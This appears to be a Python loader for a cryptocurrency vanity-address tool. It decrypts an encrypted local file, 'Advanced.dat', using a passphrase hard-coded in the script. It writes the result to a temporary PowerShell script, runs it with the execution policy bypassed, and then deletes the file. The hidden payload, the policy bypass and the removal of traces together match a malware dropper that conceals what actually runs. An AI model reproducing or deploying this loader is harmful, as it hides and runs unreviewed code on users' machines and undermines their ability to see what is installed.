import os
import hashlib
import hmac as hmac_module
import subprocess
import tempfile

from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


def main():
    root = os.path.dirname(os.path.abspath(__file__))
    dat = os.path.join(root, 'Advanced.dat')

    app_passphrase = 'Vanity-Address-Generating-Hub'

    if not os.path.isfile(dat):
        raise FileNotFoundError('Failed!')

    with open(dat, 'rb') as f:
        raw = f.read()

    if len(raw) < 81 or raw[0] != 2:
        raise ValueError('Failed!')

    salt   = raw[1:17]
    iv     = raw[17:33]
    mac    = raw[33:65]
    cipher = raw[65:]

    passphrase_bytes = app_passphrase.encode('utf-8')

    kdf_aes = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=50000,
        backend=default_backend()
    )
    aes_key = kdf_aes.derive(passphrase_bytes)

    kdf_mac = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=50001,
        backend=default_backend()
    )
    mac_key = kdf_mac.derive(passphrase_bytes)

    check = hmac_module.new(mac_key, salt + iv + cipher, hashlib.sha256).digest()
    if not hmac_module.compare_digest(check, mac):
        raise ValueError('Failed!')

    cipher_obj = Cipher(
        algorithms.AES(aes_key),
        modes.CBC(iv),
        backend=default_backend()
    )
    decryptor = cipher_obj.decryptor()
    padded = decryptor.update(cipher) + decryptor.finalize()

    unpadder = padding.PKCS7(128).unpadder()
    plain = unpadder.update(padded) + unpadder.finalize()

    script = plain.decode('utf-8')

    with tempfile.NamedTemporaryFile(suffix='.ps1', delete=False, mode='w', encoding='utf-8') as tmp:
        tmp_path = tmp.name
        tmp.write(script)

    try:
        env = os.environ.copy()
        env['INSTALL_ROOT'] = root
        env['APP_PASSPHRASE'] = app_passphrase

        subprocess.run(
            ['powershell', '-ExecutionPolicy', 'Bypass', '-File', tmp_path],
            env=env,
            check=True
        )
    finally:
        os.remove(tmp_path)


if __name__ == '__main__':
    main()